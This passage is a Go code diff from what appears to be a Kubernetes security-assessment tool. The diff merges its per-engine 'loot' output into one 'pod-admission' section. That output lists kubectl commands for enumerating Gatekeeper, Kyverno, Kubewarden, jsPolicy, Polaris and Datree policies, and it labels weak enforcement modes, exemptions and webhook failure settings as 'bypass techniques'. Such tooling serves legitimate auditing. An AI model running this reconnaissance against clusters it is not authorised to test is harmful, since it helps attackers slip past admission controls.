-			loot.Section("Gatekeeper").Addf("# Constraint Template Kind: %s", kind)
-			loot.Section("Gatekeeper").Addf("# ─────────────────────────────────────────────────────────────")
-			loot.Section("Gatekeeper").Addf("kubectl get %s", strings.ToLower(kind))
-			loot.Section("Gatekeeper").Add("")
+			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("# Constraint Template Kind: %s", kind)
+			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("kubectl get %s", strings.ToLower(kind))
+			loot.Section("pod-admission").Add("")
 
 			for _, c := range constraints {
-				loot.Section("Gatekeeper").Addf("# Constraint: %s", c.Name)
-				loot.Section("Gatekeeper").Addf("kubectl get %s %s -o yaml", strings.ToLower(kind), c.Name)
-				loot.Section("Gatekeeper").Addf("# Enforcement: %s", c.EnforcementAction)
+				loot.Section("pod-admission").Addf("# Constraint: %s", c.Name)
+				loot.Section("pod-admission").Addf("kubectl get %s %s -o yaml", strings.ToLower(kind), c.Name)
+				loot.Section("pod-admission").Addf("# Enforcement: %s", c.EnforcementAction)
 				if c.Violations > 0 {
-					loot.Section("Gatekeeper").Addf("# [!] %d existing violation(s)", c.Violations)
+					loot.Section("pod-admission").Addf("# [!] %d existing violation(s)", c.Violations)
 				}
 				if c.EnforcementAction == "dryrun" || c.EnforcementAction == "warn" {
-					loot.Section("Gatekeeper").Add("#")
-					loot.Section("Gatekeeper").Addf("# [WEAK] Enforcement action '%s' - violations not blocked", c.EnforcementAction)
+					loot.Section("pod-admission").Add("#")
+					loot.Section("pod-admission").Addf("# [WEAK] Enforcement action '%s' - violations not blocked", c.EnforcementAction)
 				}
-				loot.Section("Gatekeeper").Add("")
+				loot.Section("pod-admission").Add("")
 			}
 		}
 
-		loot.Section("Gatekeeper").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Gatekeeper").Add("# GATEKEEPER BYPASS TECHNIQUES")
-		loot.Section("Gatekeeper").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Gatekeeper").Add("#")
-		loot.Section("Gatekeeper").Add("# 1. Webhook failure bypass (if failurePolicy=Ignore):")
-		loot.Section("Gatekeeper").Add("kubectl get validatingwebhookconfiguration gatekeeper-validating-webhook-configuration -o yaml | grep failurePolicy")
-		loot.Section("Gatekeeper").Add("#")
-		loot.Section("Gatekeeper").Add("# 2. Namespace exclusion (check for exempt namespaces):")
-		loot.Section("Gatekeeper").Add("kubectl get config.config.gatekeeper.sh config -o jsonpath='{.spec.match[*].excludedNamespaces}'")
-		loot.Section("Gatekeeper").Add("#")
-		loot.Section("Gatekeeper").Add("# 3. Check for dryrun/warn constraints:")
-		loot.Section("Gatekeeper").Add("kubectl get constraints -o jsonpath='{range .items[*]}{.kind}/{.metadata.name}: {.spec.enforcementAction}{\"\\n\"}{end}'")
-		loot.Section("Gatekeeper").Add("")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("# GATEKEEPER BYPASS TECHNIQUES")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 1. Webhook failure bypass (if failurePolicy=Ignore):")
+		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration gatekeeper-validating-webhook-configuration -o yaml | grep failurePolicy")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 2. Namespace exclusion (check for exempt namespaces):")
+		loot.Section("pod-admission").Add("kubectl get config.config.gatekeeper.sh config -o jsonpath='{.spec.match[*].excludedNamespaces}'")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 3. Check for dryrun/warn constraints:")
+		loot.Section("pod-admission").Add("kubectl get constraints -o jsonpath='{range .items[*]}{.kind}/{.metadata.name}: {.spec.enforcementAction}{\"\\n\"}{end}'")
+		loot.Section("pod-admission").Add("")
 	}
 
 	// Kyverno-specific loot
 	if len(kyvernoPolicies) > 0 || len(kyvernoExceptions) > 0 {
-		loot.Section("Kyverno").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Kyverno").Add("# KYVERNO ENUMERATION")
-		loot.Section("Kyverno").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Kyverno").Add("")
-		loot.Section("Kyverno").Add("# List all ClusterPolicies:")
-		loot.Section("Kyverno").Add("kubectl get clusterpolicies")
-		loot.Section("Kyverno").Add("")
-		loot.Section("Kyverno").Add("# List all Policies (namespace-scoped):")
-		loot.Section("Kyverno").Add("kubectl get policies --all-namespaces")
-		loot.Section("Kyverno").Add("")
-		loot.Section("Kyverno").Add("# List PolicyExceptions (BYPASS VECTORS!):")
-		loot.Section("Kyverno").Add("kubectl get policyexceptions --all-namespaces")
-		loot.Section("Kyverno").Add("")
-		loot.Section("Kyverno").Add("# Check Kyverno system status:")
-		loot.Section("Kyverno").Add("kubectl get pods -n kyverno")
-		loot.Section("Kyverno").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# KYVERNO ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all ClusterPolicies:")
+		loot.Section("pod-admission").Add("kubectl get clusterpolicies")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all Policies (namespace-scoped):")
+		loot.Section("pod-admission").Add("kubectl get policies --all-namespaces")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List PolicyExceptions (BYPASS VECTORS!):")
+		loot.Section("pod-admission").Add("kubectl get policyexceptions --all-namespaces")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check Kyverno system status:")
+		loot.Section("pod-admission").Add("kubectl get pods -n kyverno")
+		loot.Section("pod-admission").Add("")
 
 		for _, policy := range kyvernoPolicies {
 			scope := "ClusterPolicy"
 			if !policy.IsClusterPolicy {
 				scope = "Policy"
 			}
-			loot.Section("Kyverno").Addf("\n# ─────────────────────────────────────────────────────────────")
-			loot.Section("Kyverno").Addf("# %s: %s", scope, policy.Name)
-			loot.Section("Kyverno").Addf("# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("# %s: %s", scope, policy.Name)
+			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
 			if policy.IsClusterPolicy {
-				loot.Section("Kyverno").Addf("kubectl get clusterpolicy %s -o yaml", policy.Name)
+				loot.Section("pod-admission").Addf("kubectl get clusterpolicy %s -o yaml", policy.Name)
 			} else {
-				loot.Section("Kyverno").Addf("kubectl get policy %s -n %s -o yaml", policy.Name, policy.Namespace)
+				loot.Section("pod-admission").Addf("kubectl get policy %s -n %s -o yaml", policy.Name, policy.Namespace)
 			}
-			loot.Section("Kyverno").Addf("# Validation Failure Action: %s", policy.ValidationFailure)
-			loot.Section("Kyverno").Addf("# Rules: %d", policy.Rules)
+			loot.Section("pod-admission").Addf("# Validation Failure Action: %s", policy.ValidationFailure)
+			loot.Section("pod-admission").Addf("# Rules: %d", policy.Rules)
 			if len(policy.RuleNames) > 0 {
-				loot.Section("Kyverno").Addf("# Rule Names: %s", strings.Join(policy.RuleNames, ", "))
+				loot.Section("pod-admission").Addf("# Rule Names: %s", strings.Join(policy.RuleNames, ", "))
 			}
 			if policy.ValidationFailure == "Audit" || policy.ValidationFailure == "audit" {
-				loot.Section("Kyverno").Add("#")
-				loot.Section("Kyverno").Add("# [WEAK] Audit mode - violations logged but not blocked")
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [WEAK] Audit mode - violations logged but not blocked")
 			}
-			loot.Section("Kyverno").Add("")
+			loot.Section("pod-admission").Add("")
 		}
 
 		// Policy Exceptions are critical bypass vectors
 		if len(kyvernoExceptions) > 0 {
-			loot.Section("Kyverno").Add("\n# ═══════════════════════════════════════════════════════════")
-			loot.Section("Kyverno").Add("# [CRITICAL] POLICY EXCEPTIONS - BYPASS VECTORS!")
-			loot.Section("Kyverno").Add("# ═══════════════════════════════════════════════════════════")
-			loot.Section("Kyverno").Add("#")
-			loot.Section("Kyverno").Add("# PolicyExceptions allow resources to BYPASS Kyverno policies")
-			loot.Section("Kyverno").Add("# Check if you can create/modify PolicyExceptions to bypass controls")
-			loot.Section("Kyverno").Add("")
+			loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+			loot.Section("pod-admission").Add("# [CRITICAL] POLICY EXCEPTIONS - BYPASS VECTORS!")
+			loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+			loot.Section("pod-admission").Add("#")
+			loot.Section("pod-admission").Add("# PolicyExceptions allow resources to BYPASS Kyverno policies")
+			loot.Section("pod-admission").Add("# Check if you can create/modify PolicyExceptions to bypass controls")
+			loot.Section("pod-admission").Add("")
 
 			for _, exception := range kyvernoExceptions {
-				loot.Section("Kyverno").Addf("\n# ─────────────────────────────────────────────────────────────")
-				loot.Section("Kyverno").Addf("# PolicyException: %s (ns: %s)", exception.Name, exception.Namespace)
-				loot.Section("Kyverno").Addf("# ─────────────────────────────────────────────────────────────")
-				loot.Section("Kyverno").Addf("kubectl get policyexception %s -n %s -o yaml", exception.Name, exception.Namespace)
+				loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+				loot.Section("pod-admission").Addf("# PolicyException: %s (ns: %s)", exception.Name, exception.Namespace)
+				loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
+				loot.Section("pod-admission").Addf("kubectl get policyexception %s -n %s -o yaml", exception.Name, exception.Namespace)
 				if len(exception.Policies) > 0 {
-					loot.Section("Kyverno").Addf("# Exempted Policies: %s", strings.Join(exception.Policies, ", "))
+					loot.Section("pod-admission").Addf("# Exempted Policies: %s", strings.Join(exception.Policies, ", "))
 				}
 				if len(exception.Rules) > 0 {
-					loot.Section("Kyverno").Addf("# Exempted Rules: %s", strings.Join(exception.Rules, ", "))
+					loot.Section("pod-admission").Addf("# Exempted Rules: %s", strings.Join(exception.Rules, ", "))
 				}
-				loot.Section("Kyverno").Add("#")
-				loot.Section("Kyverno").Add("# [ATTACK] Resources matching this exception can bypass the listed policies!")
-				loot.Section("Kyverno").Add("")
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [ATTACK] Resources matching this exception can bypass the listed policies!")
+				loot.Section("pod-admission").Add("")
 			}
 		}
 
-		loot.Section("Kyverno").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Kyverno").Add("# KYVERNO BYPASS TECHNIQUES")
-		loot.Section("Kyverno").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Kyverno").Add("#")
-		loot.Section("Kyverno").Add("# 1. Check if you can create PolicyExceptions:")
-		loot.Section("Kyverno").Add("kubectl auth can-i create policyexceptions --all-namespaces")
-		loot.Section("Kyverno").Add("#")
-		loot.Section("Kyverno").Add("# 2. Webhook failure bypass (if failurePolicy=Ignore):")
-		loot.Section("Kyverno").Add("kubectl get validatingwebhookconfiguration kyverno-resource-validating-webhook-cfg -o yaml | grep failurePolicy")
-		loot.Section("Kyverno").Add("#")
-		loot.Section("Kyverno").Add("# 3. Check for Audit-only policies:")
-		loot.Section("Kyverno").Add("kubectl get clusterpolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.validationFailureAction}{\"\\n\"}{end}'")
-		loot.Section("Kyverno").Add("#")
-		loot.Section("Kyverno").Add("# 4. Check namespace exclusions:")
-		loot.Section("Kyverno").Add("kubectl get configmap kyverno -n kyverno -o yaml | grep -A 10 excludeGroups")
-		loot.Section("Kyverno").Add("")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("# KYVERNO BYPASS TECHNIQUES")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 1. Check if you can create PolicyExceptions:")
+		loot.Section("pod-admission").Add("kubectl auth can-i create policyexceptions --all-namespaces")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 2. Webhook failure bypass (if failurePolicy=Ignore):")
+		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration kyverno-resource-validating-webhook-cfg -o yaml | grep failurePolicy")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 3. Check for Audit-only policies:")
+		loot.Section("pod-admission").Add("kubectl get clusterpolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.validationFailureAction}{\"\\n\"}{end}'")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 4. Check namespace exclusions:")
+		loot.Section("pod-admission").Add("kubectl get configmap kyverno -n kyverno -o yaml | grep -A 10 excludeGroups")
+		loot.Section("pod-admission").Add("")
 	}
 
 	// Kubewarden-specific loot
 	if len(kubewardenPolicies) > 0 {
-		loot.Section("Kubewarden").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Kubewarden").Add("# KUBEWARDEN ENUMERATION")
-		loot.Section("Kubewarden").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Kubewarden").Add("")
-		loot.Section("Kubewarden").Add("# List all ClusterAdmissionPolicies:")
-		loot.Section("Kubewarden").Add("kubectl get clusteradmissionpolicies")
-		loot.Section("Kubewarden").Add("")
-		loot.Section("Kubewarden").Add("# List all AdmissionPolicies (namespace-scoped):")
-		loot.Section("Kubewarden").Add("kubectl get admissionpolicies --all-namespaces")
-		loot.Section("Kubewarden").Add("")
-		loot.Section("Kubewarden").Add("# Check Kubewarden system status:")
-		loot.Section("Kubewarden").Add("kubectl get pods -n kubewarden")
-		loot.Section("Kubewarden").Add("kubectl get policyservers")
-		loot.Section("Kubewarden").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# KUBEWARDEN ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all ClusterAdmissionPolicies:")
+		loot.Section("pod-admission").Add("kubectl get clusteradmissionpolicies")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all AdmissionPolicies (namespace-scoped):")
+		loot.Section("pod-admission").Add("kubectl get admissionpolicies --all-namespaces")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check Kubewarden system status:")
+		loot.Section("pod-admission").Add("kubectl get pods -n kubewarden")
+		loot.Section("pod-admission").Add("kubectl get policyservers")
+		loot.Section("pod-admission").Add("")
 
 		for _, policy := range kubewardenPolicies {
 			scope := "ClusterAdmissionPolicy"
 			if !policy.IsClusterPolicy {
 				scope = "AdmissionPolicy"
 			}
-			loot.Section("Kubewarden").Addf("\n# ─────────────────────────────────────────────────────────────")
-			loot.Section("Kubewarden").Addf("# %s: %s", scope, policy.Name)
-			loot.Section("Kubewarden").Addf("# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("# %s: %s", scope, policy.Name)
+			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
 			if policy.IsClusterPolicy {
-				loot.Section("Kubewarden").Addf("kubectl get clusteradmissionpolicy %s -o yaml", policy.Name)
+				loot.Section("pod-admission").Addf("kubectl get clusteradmissionpolicy %s -o yaml", policy.Name)
 			} else {
-				loot.Section("Kubewarden").Addf("kubectl get admissionpolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
+				loot.Section("pod-admission").Addf("kubectl get admissionpolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
 			}
-			loot.Section("Kubewarden").Addf("# Module: %s", policy.Module)
-			loot.Section("Kubewarden").Addf("# Mode: %s", policy.Mode)
-			loot.Section("Kubewarden").Addf("# Mutating: %t", policy.Mutating)
+			loot.Section("pod-admission").Addf("# Module: %s", policy.Module)
+			loot.Section("pod-admission").Addf("# Mode: %s", policy.Mode)
+			loot.Section("pod-admission").Addf("# Mutating: %t", policy.Mutating)
 			if policy.Mode == "monitor" {
-				loot.Section("Kubewarden").Add("#")
-				loot.Section("Kubewarden").Add("# [WEAK] Monitor mode - violations logged but not blocked")
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [WEAK] Monitor mode - violations logged but not blocked")
 			}
-			loot.Section("Kubewarden").Add("")
+			loot.Section("pod-admission").Add("")
 		}
 
-		loot.Section("Kubewarden").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Kubewarden").Add("# KUBEWARDEN BYPASS TECHNIQUES")
-		loot.Section("Kubewarden").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Kubewarden").Add("#")
-		loot.Section("Kubewarden").Add("# 1. Check for monitor-mode policies:")
-		loot.Section("Kubewarden").Add("kubectl get clusteradmissionpolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.mode}{\"\\n\"}{end}'")
-		loot.Section("Kubewarden").Add("#")
-		loot.Section("Kubewarden").Add("# 2. Check PolicyServer status:")
-		loot.Section("Kubewarden").Add("kubectl get policyservers -o yaml")
-		loot.Section("Kubewarden").Add("#")
-		loot.Section("Kubewarden").Add("# 3. Webhook failure bypass:")
-		loot.Section("Kubewarden").Add("kubectl get validatingwebhookconfiguration -l kubewarden -o yaml | grep failurePolicy")
-		loot.Section("Kubewarden").Add("")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("# KUBEWARDEN BYPASS TECHNIQUES")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 1. Check for monitor-mode policies:")
+		loot.Section("pod-admission").Add("kubectl get clusteradmissionpolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.mode}{\"\\n\"}{end}'")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 2. Check PolicyServer status:")
+		loot.Section("pod-admission").Add("kubectl get policyservers -o yaml")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 3. Webhook failure bypass:")
+		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration -l kubewarden -o yaml | grep failurePolicy")
+		loot.Section("pod-admission").Add("")
 	}
 
 	// jsPolicy-specific loot
 	if len(jsPolicies) > 0 {
-		loot.Section("jsPolicy").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("jsPolicy").Add("# JSPOLICY ENUMERATION")
-		loot.Section("jsPolicy").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("jsPolicy").Add("")
-		loot.Section("jsPolicy").Add("# List all ClusterJsPolicies:")
-		loot.Section("jsPolicy").Add("kubectl get clusterjspolicies")
-		loot.Section("jsPolicy").Add("")
-		loot.Section("jsPolicy").Add("# List all JsPolicies (namespace-scoped):")
-		loot.Section("jsPolicy").Add("kubectl get jspolicies --all-namespaces")
-		loot.Section("jsPolicy").Add("")
-		loot.Section("jsPolicy").Add("# Check jsPolicy system status:")
-		loot.Section("jsPolicy").Add("kubectl get pods -n jspolicy")
-		loot.Section("jsPolicy").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# JSPOLICY ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all ClusterJsPolicies:")
+		loot.Section("pod-admission").Add("kubectl get clusterjspolicies")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all JsPolicies (namespace-scoped):")
+		loot.Section("pod-admission").Add("kubectl get jspolicies --all-namespaces")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check jsPolicy system status:")
+		loot.Section("pod-admission").Add("kubectl get pods -n jspolicy")
+		loot.Section("pod-admission").Add("")
 
 		for _, policy := range jsPolicies {
 			scope := "ClusterJsPolicy"
 			if !policy.IsClusterPolicy {
 				scope = "JsPolicy"
 			}
-			loot.Section("jsPolicy").Addf("\n# ─────────────────────────────────────────────────────────────")
-			loot.Section("jsPolicy").Addf("# %s: %s", scope, policy.Name)
-			loot.Section("jsPolicy").Addf("# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("# %s: %s", scope, policy.Name)
+			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
 			if policy.IsClusterPolicy {
-				loot.Section("jsPolicy").Addf("kubectl get clusterjspolicy %s -o yaml", policy.Name)
+				loot.Section("pod-admission").Addf("kubectl get clusterjspolicy %s -o yaml", policy.Name)
 			} else {
-				loot.Section("jsPolicy").Addf("kubectl get jspolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
+				loot.Section("pod-admission").Addf("kubectl get jspolicy %s -n %s -o yaml", policy.Name, policy.Namespace)
 			}
-			loot.Section("jsPolicy").Addf("# Type: %s", policy.Type)
+			loot.Section("pod-admission").Addf("# Type: %s", policy.Type)
 			if len(policy.Operations) > 0 {
-				loot.Section("jsPolicy").Addf("# Operations: %s", strings.Join(policy.Operations, ", "))
+				loot.Section("pod-admission").Addf("# Operations: %s", strings.Join(policy.Operations, ", "))
 			}
 			if len(policy.Resources) > 0 {
-				loot.Section("jsPolicy").Addf("# Resources: %s", strings.Join(policy.Resources, ", "))
+				loot.Section("pod-admission").Addf("# Resources: %s", strings.Join(policy.Resources, ", "))
 			}
 			if policy.ViolationPolicy == "warn" {
-				loot.Section("jsPolicy").Add("#")
-				loot.Section("jsPolicy").Add("# [WEAK] Violation policy 'warn' - violations logged but not blocked")
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [WEAK] Violation policy 'warn' - violations logged but not blocked")
 			}
-			loot.Section("jsPolicy").Add("")
+			loot.Section("pod-admission").Add("")
 		}
 
-		loot.Section("jsPolicy").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("jsPolicy").Add("# JSPOLICY BYPASS TECHNIQUES")
-		loot.Section("jsPolicy").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("jsPolicy").Add("#")
-		loot.Section("jsPolicy").Add("# 1. Check for warn-only policies:")
-		loot.Section("jsPolicy").Add("kubectl get clusterjspolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.violationPolicy}{\"\\n\"}{end}'")
-		loot.Section("jsPolicy").Add("#")
-		loot.Section("jsPolicy").Add("# 2. Webhook failure bypass:")
-		loot.Section("jsPolicy").Add("kubectl get validatingwebhookconfiguration jspolicy-webhook -o yaml | grep failurePolicy")
-		loot.Section("jsPolicy").Add("")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("# JSPOLICY BYPASS TECHNIQUES")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 1. Check for warn-only policies:")
+		loot.Section("pod-admission").Add("kubectl get clusterjspolicies -o jsonpath='{range .items[*]}{.metadata.name}: {.spec.violationPolicy}{\"\\n\"}{end}'")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 2. Webhook failure bypass:")
+		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration jspolicy-webhook -o yaml | grep failurePolicy")
+		loot.Section("pod-admission").Add("")
 	}
 
 	// Polaris-specific loot
 	if polarisConfig.WebhookEnabled || polarisConfig.ConfigMap != "" {
-		loot.Section("Polaris").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Polaris").Add("# POLARIS ENUMERATION")
-		loot.Section("Polaris").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Polaris").Add("")
-		loot.Section("Polaris").Add("# Check Polaris webhook:")
-		loot.Section("Polaris").Add("kubectl get validatingwebhookconfiguration | grep -i polaris")
-		loot.Section("Polaris").Add("")
-		loot.Section("Polaris").Add("# Check Polaris pods:")
-		loot.Section("Polaris").Add("kubectl get pods -n polaris")
-		loot.Section("Polaris").Add("kubectl get pods -n fairwinds")
-		loot.Section("Polaris").Add("")
-		loot.Section("Polaris").Add("# Get Polaris configuration:")
-		loot.Section("Polaris").Addf("kubectl get configmap polaris -n %s -o yaml", polarisConfig.Namespace)
-		loot.Section("Polaris").Add("")
-		loot.Section("Polaris").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Polaris").Add("# POLARIS BYPASS TECHNIQUES")
-		loot.Section("Polaris").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Polaris").Add("#")
-		loot.Section("Polaris").Add("# 1. Check for exemptions in config:")
-		loot.Section("Polaris").Addf("kubectl get configmap polaris -n %s -o jsonpath='{.data.config\\.yaml}' | grep -A 20 exemptions", polarisConfig.Namespace)
-		loot.Section("Polaris").Add("#")
-		loot.Section("Polaris").Add("# 2. Webhook failure bypass:")
-		loot.Section("Polaris").Add("kubectl get validatingwebhookconfiguration polaris-webhook -o yaml | grep failurePolicy")
-		loot.Section("Polaris").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# POLARIS ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check Polaris webhook:")
+		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration | grep -i polaris")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check Polaris pods:")
+		loot.Section("pod-admission").Add("kubectl get pods -n polaris")
+		loot.Section("pod-admission").Add("kubectl get pods -n fairwinds")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Get Polaris configuration:")
+		loot.Section("pod-admission").Addf("kubectl get configmap polaris -n %s -o yaml", polarisConfig.Namespace)
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("# POLARIS BYPASS TECHNIQUES")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 1. Check for exemptions in config:")
+		loot.Section("pod-admission").Addf("kubectl get configmap polaris -n %s -o jsonpath='{.data.config\\.yaml}' | grep -A 20 exemptions", polarisConfig.Namespace)
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 2. Webhook failure bypass:")
+		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfiguration polaris-webhook -o yaml | grep failurePolicy")
+		loot.Section("pod-admission").Add("")
 	}
 
 	// Datree-specific loot
 	if datreeConfig.WebhookEnabled {
-		loot.Section("Datree").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Datree").Add("# DATREE ENUMERATION")
-		loot.Section("Datree").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Datree").Add("")
-		loot.Section("Datree").Add("# Check Datree webhook:")
-		loot.Section("Datree").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", datreeConfig.WebhookName)
-		loot.Section("Datree").Add("")
-		loot.Section("Datree").Add("# Check Datree pods:")
-		loot.Section("Datree").Add("kubectl get pods -n datree")
-		loot.Section("Datree").Add("kubectl get pods --all-namespaces | grep -i datree")
-		loot.Section("Datree").Add("")
-		loot.Section("Datree").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Datree").Add("# DATREE BYPASS TECHNIQUES")
-		loot.Section("Datree").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("Datree").Add("#")
-		loot.Section("Datree").Add("# 1. Webhook failure bypass:")
-		loot.Section("Datree").Addf("kubectl get validatingwebhookconfiguration %s -o yaml | grep failurePolicy", datreeConfig.WebhookName)
-		loot.Section("Datree").Add("#")
-		loot.Section("Datree").Add("# 2. Check for namespace exclusions:")
-		loot.Section("Datree").Addf("kubectl get validatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", datreeConfig.WebhookName)
-		loot.Section("Datree").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# DATREE ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check Datree webhook:")
+		loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", datreeConfig.WebhookName)
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check Datree pods:")
+		loot.Section("pod-admission").Add("kubectl get pods -n datree")
+		loot.Section("pod-admission").Add("kubectl get pods --all-namespaces | grep -i datree")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("# DATREE BYPASS TECHNIQUES")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# 1. Webhook failure bypass:")
+		loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o yaml | grep failurePolicy", datreeConfig.WebhookName)
+		loot.Section("pod-admission").Add("#")
